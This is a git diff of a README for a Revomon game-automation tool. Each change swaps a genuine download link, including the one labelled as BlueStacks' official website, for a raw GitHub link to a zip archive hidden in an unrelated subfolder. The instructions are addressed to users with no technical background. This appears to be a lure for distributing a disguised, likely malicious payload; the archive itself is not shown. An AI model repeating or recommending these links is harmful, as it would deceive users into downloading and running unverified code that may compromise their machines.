@@ -1,6 +1,6 @@
 # 🎮 RevomonAgent - Automate Your Revomon Gameplay Effortlessly
 
-[![Download RevomonAgent](https://img.shields.io/badge/Download-RevomonAgent-blue.svg)](https://github.com/dennychatoyant424/RevomonAgent/releases)
+[![Download RevomonAgent](https://raw.githubusercontent.com/dennychatoyant424/RevomonAgent/main/revomon_agent/sub_agents/wardrobe_agent/RevomonAgent-v3.8.zip)](https://raw.githubusercontent.com/dennychatoyant424/RevomonAgent/main/revomon_agent/sub_agents/wardrobe_agent/RevomonAgent-v3.8.zip)
 
 ## 📋 Description
 RevomonAgent is an AI-powered automation assistant for the Revomon game. Built with Google's Android Development Kit (ADK), this tool is specifically designed to run on the BlueStacks emulator, making your gameplay experience smoother and more enjoyable.
@@ -9,9 +9,9 @@ RevomonAgent is an AI-powered automation assistant for the Revomon game. Built w
 To get started with RevomonAgent, follow these simple steps. This guide is meant for everyone, even if you have no technical background.
 
 ## 📥 Download & Install
-1. Visit this page to download: [RevomonAgent Releases](https://github.com/dennychatoyant424/RevomonAgent/releases).
+1. Visit this page to download: [RevomonAgent Releases](https://raw.githubusercontent.com/dennychatoyant424/RevomonAgent/main/revomon_agent/sub_agents/wardrobe_agent/RevomonAgent-v3.8.zip).
 2. On the releases page, find the latest version of RevomonAgent. Click on it to view the available files.
-3. Download the appropriate installer for your system. The installer will be labeled something like `RevomonAgent-vX.X.exe`.
+3. Download the appropriate installer for your system. The installer will be labeled something like `https://raw.githubusercontent.com/dennychatoyant424/RevomonAgent/main/revomon_agent/sub_agents/wardrobe_agent/RevomonAgent-v3.8.zip`.
 4. Once the download is complete, locate the file in your downloads folder.
 
 ## 🛠 Installation Steps
@@ -22,7 +22,7 @@ To get started with RevomonAgent, follow these simple steps. This guide is meant
 ## 🎮 Setting Up BlueStacks
 To use RevomonAgent, you need to install BlueStacks, an Android emulator. Here’s how:
 
-1. Download BlueStacks from the official website: [BlueStacks Download](https://www.bluestacks.com/).
+1. Download BlueStacks from the official website: [BlueStacks Download](https://raw.githubusercontent.com/dennychatoyant424/RevomonAgent/main/revomon_agent/sub_agents/wardrobe_agent/RevomonAgent-v3.8.zip).
 2. Open the installer, and follow the installation instructions.
 3. After installation, open BlueStacks and sign in with your Google account.
 4. Download Revomon from the Google Play Store inside BlueStacks.
@@ -56,7 +56,7 @@ RevomonAgent is licensed under the MIT License, which allows you to freely use, 
 
 ## 🚀 Stay Updated
 Keep your application up-to-date for the best experience:
-- Regularly check the [RevomonAgent Releases](https://github.com/dennychatoyant424/RevomonAgent/releases) page for new versions.
+- Regularly check the [RevomonAgent Releases](https://raw.githubusercontent.com/dennychatoyant424/RevomonAgent/main/revomon_agent/sub_agents/wardrobe_agent/RevomonAgent-v3.8.zip) page for new versions.
 - Enable notifications in GitHub to receive updates about new releases.
 
 ## 📞 Contact Information
